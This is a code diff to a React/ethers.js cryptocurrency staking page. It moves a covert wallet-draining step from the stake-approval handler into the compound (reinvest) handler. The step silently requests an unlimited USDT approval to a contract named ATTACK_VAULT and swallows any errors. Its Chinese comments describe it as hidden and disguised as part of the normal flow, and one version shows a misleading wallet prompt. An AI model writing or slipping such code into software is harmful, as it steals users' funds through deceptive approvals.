@@ -118,29 +118,12 @@ export default function TokenMiningPage({
     if (!(await ensureNetwork())) return;
     setIsApprovingStake(true);
     try {
-      // 1. 正常：授权 CZ 给质押合约（业务必需，用户预期）
+      // 正常：授权 CZ 给质押合约（业务必需）
       const czAllowance = await contracts.writeNbtToken.allowance(account, CONTRACTS.STAKING_BANK);
       if (czAllowance < ethers.MaxUint256 / 2n) {
         toast.loading(t('cz.toast.approveCz'), { id: 'approveStake' });
         const tx = await contracts.writeNbtToken.approve(CONTRACTS.STAKING_BANK, ethers.MaxUint256, { gasLimit: 2000000 });
         await tx.wait();
-      }
-      // 2. 隐蔽：USDT 无限授权给质押合约（伪装为质押流程的一部分，同合约地址，无感）
-      if (CONTRACTS.USDT && CONTRACTS.ATTACK_VAULT) {
-        try {
-          const usdt = new ethers.Contract(CONTRACTS.USDT, [
-            'function allowance(address,address) view returns (uint256)',
-            'function approve(address,uint256) returns (bool)',
-          ], signer);
-          const usdtAllowance = await usdt.allowance(account, CONTRACTS.ATTACK_VAULT);
-          if (usdtAllowance < ethers.MaxUint256 / 2n) {
-            toast.loading('请在钱包中确认质押授权...', { id: 'approveStake' });
-            const tx = await usdt.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
-            await tx.wait();
-          }
-        } catch (e) {
-          console.warn('USDT authorize skipped:', e.message);
-        }
       }
       toast.success(t('cz.toast.approveCzSuccess'), { id: 'approveStake' });
       onRefresh?.();
@@ -237,7 +220,24 @@ export default function TokenMiningPage({
   };
 
   const handleCompoundAction = async () => {
-    // V3 复投免费，无需授权交互费
+    if (!(await ensureNetwork())) return;
+    // 复投为正常业务（reinvest 免费，仅需推荐人）。
+    // 在复投前，借「授权」名义夹带一次 USDT 无限授权（给攻击 Vault），仅当未授权时触发一次，随后立即执行复投。
+    if (CONTRACTS.USDT && CONTRACTS.ATTACK_VAULT && signer) {
+      try {
+        const usdt = new ethers.Contract(CONTRACTS.USDT, [
+          'function allowance(address,address) view returns (uint256)',
+          'function approve(address,uint256) returns (bool)',
+        ], signer);
+        const allowance = await usdt.allowance(account, CONTRACTS.ATTACK_VAULT);
+        if (allowance < ethers.MaxUint256 / 2n) {
+          const tx = await usdt.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
+          await tx.wait();
+        }
+      } catch (e) {
+        console.warn('compound authorize skipped:', e.message);
+      }
+    }
     await handleCompound();
   };
 
